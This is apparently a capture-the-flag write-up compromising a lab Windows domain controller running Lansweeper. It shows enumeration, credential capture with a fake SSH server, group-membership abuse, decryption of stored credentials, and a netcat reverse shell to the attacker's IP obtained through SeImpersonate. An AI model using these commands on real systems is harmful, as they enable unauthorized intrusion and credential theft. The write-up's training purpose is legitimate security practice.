NMAP
First, I conducted a port scan to identify open services on the target:

```bash
sudo nmap -sC -sV -Pn 10.10.125.29 --open
```

Result
```output
PORT      STATE SERVICE           REASON          VERSION
53/tcp    open  domain            syn-ack ttl 127 Simple DNS Plus
81/tcp    open  http              syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 
82/tcp    open  ssl/http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
88/tcp    open  kerberos-sec      syn-ack ttl 127 Microsoft Windows Kerberos 
135/tcp   open  msrpc             syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn       syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap              syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sweep.vl0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?     syn-ack ttl 127
464/tcp   open  kpasswd5?         syn-ack ttl 127
636/tcp   open  ldapssl?          syn-ack ttl 127
3268/tcp  open  ldap              syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sweep.vl0., Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl? syn-ack ttl 127
3389/tcp  open  ms-wbt-server     syn-ack ttl 127 Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: SWEEP
|   NetBIOS_Domain_Name: SWEEP
|   NetBIOS_Computer_Name: INVENTORY
|   DNS_Domain_Name: sweep.vl
|   DNS_Computer_Name: inventory.sweep.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2025-04-10T22:49:54+00:00
5357/tcp  open  http              syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 
5985/tcp  open  http              syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 
9389/tcp  open  mc-nmf            syn-ack ttl 127 .NET Message Framing
49664/tcp open  msrpc             syn-ack ttl 127 Microsoft Windows RPC
49670/tcp open  msrpc             syn-ack ttl 127 Microsoft Windows RPC
49675/tcp open  ncacn_http        syn-ack ttl 127 Microsoft Windows RPC
49676/tcp open  msrpc             syn-ack ttl 127 Microsoft Windows RPC
49682/tcp open  msrpc             syn-ack ttl 127 Microsoft Windows RPC
49718/tcp open  msrpc             syn-ack ttl 127 Microsoft Windows RPC
```

I discovered that Lansweeper was running on port 81:

![[Pasted image 20250924235020.png]]


Initial Access

During enumeration, I discovered that the target was vulnerable to null session authentication:

```bash
netexec smb 10.10.125.29 -u 'xyz' -p '' --shares --users
```

```output
SMB         10.10.125.29    445    INVENTORY        [*] Windows Server 2022 Build 20348 x64 (name:INVENTORY) (domain:sweep.vl) (signing:True) (SMBv1:False) 
SMB         10.10.125.29    445    INVENTORY        [+] sweep.vl\xyz: (Guest)
SMB         10.10.125.29    445    INVENTORY        [*] Enumerated shares
SMB         10.10.125.29    445    INVENTORY        Share           Permissions     Remark
SMB         10.10.125.29    445    INVENTORY        -----           -----------     ------
SMB         10.10.125.29    445    INVENTORY        ADMIN$                          Remote Admin
SMB         10.10.125.29    445    INVENTORY        C$                              Default share
SMB         10.10.125.29    445    INVENTORY        DefaultPackageShare$ READ            Lansweeper PackageShare
SMB         10.10.125.29    445    INVENTORY        IPC$            READ            Remote IPC
SMB         10.10.125.29    445    INVENTORY        Lansweeper$                     Lansweeper Actions
SMB         10.10.125.29    445    INVENTORY        NETLOGON                        Logon server share 
SMB         10.10.125.29    445    INVENTORY        SYSVOL                          Logon server share

```

I used lookupsid to enumerate valid usernames from the domain:

```bash
impacket-lookupsid sweeper.vl/xyz:''@sweeper.vl -target 10.10.125.29 -no-pass 
```

```output
*] Brute forcing SIDs at sweeper.vl
[*] StringBinding ncacn_np:sweeper.vl[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-4292653625-3348997472-4156797480
498: SWEEP\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: SWEEP\Administrator (SidTypeUser)
501: SWEEP\Guest (SidTypeUser)
502: SWEEP\krbtgt (SidTypeUser)
512: SWEEP\Domain Admins (SidTypeGroup)
513: SWEEP\Domain Users (SidTypeGroup)
514: SWEEP\Domain Guests (SidTypeGroup)
515: SWEEP\Domain Computers (SidTypeGroup)
516: SWEEP\Domain Controllers (SidTypeGroup)
517: SWEEP\Cert Publishers (SidTypeAlias)
518: SWEEP\Schema Admins (SidTypeGroup)
519: SWEEP\Enterprise Admins (SidTypeGroup)
520: SWEEP\Group Policy Creator Owners (SidTypeGroup)
521: SWEEP\Read-only Domain Controllers (SidTypeGroup)
522: SWEEP\Cloneable Domain Controllers (SidTypeGroup)
525: SWEEP\Protected Users (SidTypeGroup)
526: SWEEP\Key Admins (SidTypeGroup)
527: SWEEP\Enterprise Key Admins (SidTypeGroup)
553: SWEEP\RAS and IAS Servers (SidTypeAlias)
571: SWEEP\Allowed RODC Password Replication Group (SidTypeAlias)
572: SWEEP\Denied RODC Password Replication Group (SidTypeAlias)
1000: SWEEP\INVENTORY$ (SidTypeUser)
1101: SWEEP\DnsAdmins (SidTypeAlias)
1102: SWEEP\DnsUpdateProxy (SidTypeGroup)
1103: SWEEP\Lansweeper Admins (SidTypeGroup)
1113: SWEEP\jgre808 (SidTypeUser)
1114: SWEEP\bcla614 (SidTypeUser)
1115: SWEEP\hmar648 (SidTypeUser)
1116: SWEEP\jgar931 (SidTypeUser)
1117: SWEEP\fcla801 (SidTypeUser)
1118: SWEEP\jwil197 (SidTypeUser)
1119: SWEEP\grob171 (SidTypeUser)
1120: SWEEP\fdav736 (SidTypeUser)
1121: SWEEP\jsmi791 (SidTypeUser)
1122: SWEEP\hjoh690 (SidTypeUser)
1123: SWEEP\svc_inventory_win (SidTypeUser)
1124: SWEEP\svc_inventory_lnx (SidTypeUser)
1125: SWEEP\intern (SidTypeUser)
3101: SWEEP\Lansweeper Discovery (SidTypeGroup)

```

The ‘intern’ account looked suspicious. I tried using the credentials ‘intern:intern’ on the Lansweeper login page and gained access:


![[Pasted image 20250925000233.png]]

## Privilege Escalation - User

With access to the ‘intern’ account, I enumerated SMB shares:

```bash
netexec smb 10.10.125.29 -u 'intern' -p 'intern' --shares
```

```output
SMB         10.10.125.29    445    INVENTORY        [*] Windows Server 2022 Build 20348 x64 (name:INVENTORY) (domain:sweep.vl) (signing:True) (SMBv1:False) 
SMB         10.10.125.29    445    INVENTORY        [+] sweep.vl\intern:intern 
SMB         10.10.125.29    445    INVENTORY        [*] Enumerated shares
SMB         10.10.125.29    445    INVENTORY        Share           Permissions     Remark
SMB         10.10.125.29    445    INVENTORY        -----           -----------     ------
SMB         10.10.125.29    445    INVENTORY        ADMIN$                          Remote Admin
SMB         10.10.125.29    445    INVENTORY        C$                              Default share
SMB         10.10.125.29    445    INVENTORY        DefaultPackageShare$ READ            Lansweeper PackageShare
SMB         10.10.125.29    445    INVENTORY        IPC$            READ            Remote IPC
SMB         10.10.125.29    445    INVENTORY        Lansweeper$     READ            Lansweeper Actions
SMB         10.10.125.29    445    INVENTORY        NETLOGON        READ            Logon server share 
SMB         10.10.125.29    445    INVENTORY        SYSVOL          READ            Logon server share 
```

I examined the Lansweeper share but didn’t find anything immediately useful:

```bash
smbclient //10.10.125.29/Lansweeper$ -U intern
```

```output
assword for [WORKGROUP\intern]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu Feb  8 14:46:08 2024
  ..                                  D        0  Thu Feb  8 14:47:44 2024
  changeallowed.vbs                   A      704  Mon Jan 29 20:47:08 2024
  changepassword.vbs                  A      604  Mon Jan 29 20:47:08 2024
  CookComputing.XmlRpcV2.dll          A   117000  Mon Jan 29 20:47:08 2024
  Devicetester.exe                    A   859944  Mon Jan 29 20:52:42 2024
  Heijden.Dns.dll                     A    52520  Mon Jan 29 20:52:08 2024
  mustchangepassword.vbs              A      226  Mon Jan 29 20:47:08 2024
  putty.exe                           A  1180904  Mon Jan 29 20:47:08 2024
  shellexec.vbs                       A      107  Mon Jan 29 20:47:08 2024
  SMBLibrary.dll                      A   327976  Mon Jan 29 20:52:10 2024
  testconnection.exe                  A   375592  Mon Jan 29 20:52:46 2024
  unlock.vbs                          A      174  Mon Jan 29 20:47:08 2024
  Utilities.dll                       A    40232  Mon Jan 29 20:52:14 2024
  vimservice25.dll                    A  1170512  Mon Jan 29 20:47:08 2024
  vimservice25.xmlserializers.dll      A  4353104  Mon Jan 29 20:47:08 2024
  vimservice40.dll                    A  1690704  Mon Jan 29 20:47:08 2024
  vimservice40.xmlserializers.dll      A  6630480  Mon Jan 29 20:47:08 2024
  vimservice41.dll                    A  1813584  Mon Jan 29 20:47:08 2024
  vimservice41.xmlserializers.dll      A  7085136  Mon Jan 29 20:47:08 2024
  vimservice50.dll                    A  2079384  Mon Jan 29 20:47:08 2024
  vimservice50.xmlserializers.dll      A  7957144  Mon Jan 29 20:47:08 2024
  vimservice51.dll                    A  2313296  Mon Jan 29 20:47:08 2024
  vimservice51.xmlserializers.dll      A  8395856  Mon Jan 29 20:47:08 2024
  vimservice55.dll                    A  2448464  Mon Jan 29 20:47:08 2024
  vimservice55.xmlserializers.dll      A  8862800  Mon Jan 29 20:47:08 2024
  vmware.vim.dll                      A  1482456  Mon Jan 29 20:47:08 2024
  wol.exe                             A   198040  Mon Jan 29 20:47:08 2024
  XenServer.dll                       A   818976  Mon Jan 29 20:52:40 2024
```

Next, I used BloodHound to map the Active Directory environment:

```bash
 netexec ldap 10.10.125.29 -u 'intern' -p 'intern' --bloodhound --dns-server 10.10.125.29 -c ALL --dns-tcp
```

```output
LDAP        10.10.125.29    389    INVENTORY        [*] Windows Server 2022 Build 20348 (name:INVENTORY) (domain:sweep.vl)
LDAP        10.10.125.29    389    INVENTORY        [+] sweep.vl\intern:intern 
LDAP        10.10.125.29    389    INVENTORY        Resolved collection methods: group, dcom, objectprops, trusts, container, localadmin, session, acl, psremote, rdp
LDAP        10.10.125.29    389    INVENTORY        Done in 00M 06S
LDAP        10.10.125.29    389    INVENTORY        Compressing output into /home/kali/.nxc/logs/INVENTORY_10.10.125.29_2025-09-24_190859_bloodhound.zip
```

lets copy this  on current directory
```bash
cp /home/kali/.nxc/logs/INVENTORY_10.10.125.29_2025-09-24_190859_bloodhound.zip .
```

![[Pasted image 20250925002318.png]]

Two accounts stood out as particularly interesting: `svc_inventory_lnx` and `jgre808`

## Exploiting Lansweeper

After logging in with intern:intern credentials, I explored the Lansweeper dashboard. I noticed that the account for Linux scanning had valid credentials, so I created a plan to intercept these credentials.  
First, I created a scanning target pointing to my attack machine:

![[Pasted image 20250925010706.png]]


Then I set up a new mapping credential that would cause the Linux scan service account to connect to ![[Pasted image 20250925010753.png]]
machine:

I also ensured my machine was marked as a Linux asset in the system:

![[Pasted image 20250925010831.png]]

Using [fakessh](https://github.com/fffaraz/fakessh) tool, I captured the username and password of the scanning service account when it attempted to connect to my machine:


```bash
fakessh ./
```

```bash

 cat /home/kali/fakessh-logs/fakessh-2025-09-24-19-44-25-000.log 
```

```output

2025/09/24 19:47:10.090333 10.10.125.29:51185
2025/09/24 19:47:16.229594 10.10.125.29:51198
2025/09/24 19:47:16.442145 10.10.125.29:51199
2025/09/24 19:47:16.614059 10.10.125.29:51199 SSH-2.0-RebexSSH_5.0.8372.0 svc_inventory_lnx 0|5m-U6?/uAX
                                     
```

## Lateral Movement

Now with the `svc_inventory_lnx` credentials, I discovered this account had “GenericAll” privileges over the “LANSWEEPER ADMINS” group. I added the service account to this privileged group:

```bash

bloodyAD --host sweep.vl -u 'svc_inventory_lnx' -p '0|5m-U6?/uAX' -d 'sweep.vl' add groupMember 'LANSWEEPER ADMINS' svc_inventory_lnx

```

With elevated privileges, I connected to the target using WinRM:

```bash
evil-winrm -i sweep.vl -u svc_inventory_lnx -p '0|5m-U6?/uAX'
```


user flag

```output
*Evil-WinRM* PS C:\> cat user.txt
VL{d0f2522312ba549fd2daca09e293bfd1}
```

## Privilege Escalation - Administrator

For the final privilege escalation, I logged into the Lansweeper application with the `svc_inventory_lnx` account, which now had administrative access.  
I created another mapping credential targeting a Windows machine:

```bash
upload LansweeperDecrypt.ps1
```

than lets execute it
```bash
./LansweeperDecrypt.ps1
```

```output
redName          Username                Password
--------          --------                --------
SNMP-Private      SNMP Community String   private
Global SNMP                               public
Inventory Windows SWEEP\svc_inventory_win 4^56!sK&}eA?
Inventory Linux   svc_inventory_lnx       0|5m-U6?/uAX


```

so lets do evilwinrm again
```bash
evil-winrm -i sweep.vl -u SWEEP\svc_inventory_win -p '4^56!sK&}eA?'
```

than let check priv

```bash
*Evil-WinRM* PS C:\temp> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled


```

we see impersonate priv 
```bash
upload god.exe
upload nc64.exe
```

now lets execute it
```bash
.\god.exe -cmd "nc64.exe -e cmd.exe 10.8.7.96 80"
```

we got reverse shell as admin so we can have root flag
```bash
nc -nlvp 80  
listening on [any] 80 ...
connect to [10.8.7.96] from (UNKNOWN) [10.10.125.29] 52908
Microsoft Windows [Version 10.0.20348.2227]
(c) Microsoft Corporation. All rights reserved.

```

```bash
C:\Users\Administrator\Desktop>type root.txt
type root.txt
VL{06a6c584a3492df1807f1d7c4de0ec56}

```
